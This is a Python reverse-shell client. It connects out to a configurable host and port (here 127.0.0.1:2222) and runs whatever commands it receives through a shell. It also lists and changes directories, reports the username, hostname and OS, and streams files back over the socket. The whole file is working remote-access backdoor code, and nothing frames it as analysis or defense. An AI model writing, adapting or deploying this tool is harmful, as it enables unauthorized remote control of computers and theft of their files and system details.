import socket
import subprocess
import os
import platform
import getpass
import colorama
from colorama import Fore, Style
from time import sleep
import traceback

colorama.init()

RHOST = "127.0.0.1"
RPORT = 2222

def send_data(sock, data):
    try:
        if isinstance(data, str):
            data = data.encode()
        sock.sendall(data)
    except Exception as e:
        print(f"Failed to send data: {e}")

def receive_data(sock):
    try:
        return sock.recv(1024).decode("utf-8")
    except Exception as e:
        print(f"Failed to receive data: {e}")
        return None

def list_files(sock):
    try:
        files = os.listdir(".")
        send_data(sock, str(files))
    except Exception as e:
        send_data(sock, f"Error listing files: {e}")

def change_directory(sock, cmd):
    try:
        os.chdir(cmd.split(" ")[1])
        send_data(sock, f"Changed directory to {os.getcwd()}")
    except Exception as e:
        send_data(sock, f"Error changing directory: {e}")

def get_sysinfo(sock):
    try:
        sysinfo = f"""
Operating System: {platform.system()}
Computer Name: {platform.node()}
Username: {getpass.getuser()}
Release Version: {platform.release()}
Processor Architecture: {platform.processor()}
        """
        send_data(sock, sysinfo)
    except Exception as e:
        send_data(sock, f"Error getting system info: {e}")

def download_file(sock, cmd):
    try:
        file_path = cmd.split(" ")[1]
        with open(file_path, "rb") as f:
            file_data = f.read(1024)
            while file_data:
                send_data(sock, file_data)
                file_data = f.read(1024)
            sleep(2)
            send_data(sock, "DONE")
        print("Finished sending data")
    except Exception as e:
        send_data(sock, f"Error downloading file: {e}")

def execute_command(sock, cmd):
    try:
        comm = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        STDOUT, STDERR = comm.communicate()
        if not STDOUT:
            send_data(sock, STDERR)
        else:
            send_data(sock, STDOUT)
    except Exception as e:
        send_data(sock, f"Error executing command: {e}")

def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((RHOST, RPORT))

    while True:
        try:
            header = f"{Fore.RED}{getpass.getuser()}@{platform.node()}{Style.RESET_ALL}:{Fore.LIGHTBLUE_EX}{os.getcwd()}{Style.RESET_ALL}$ "
            send_data(sock, header)
            cmd = receive_data(sock)

            if not cmd:
                print("Connection dropped")
                break

            print(f"Received command: {cmd}")

            if cmd == "list":
                list_files(sock)
            elif cmd.split(" ")[0] == "cd":
                change_directory(sock, cmd)
            elif cmd == "sysinfo":
                get_sysinfo(sock)
            elif cmd.split(" ")[0] == "download":
                download_file(sock, cmd)
            elif cmd == "exit":
                send_data(sock, "exit")
                break
            else:
                execute_command(sock, cmd)

        except Exception as e:
            error_message = f"An error has occurred: {str(e)}\n{traceback.format_exc()}"
            send_data(sock, error_message)

    sock.close()

if __name__ == "__main__":
    main()
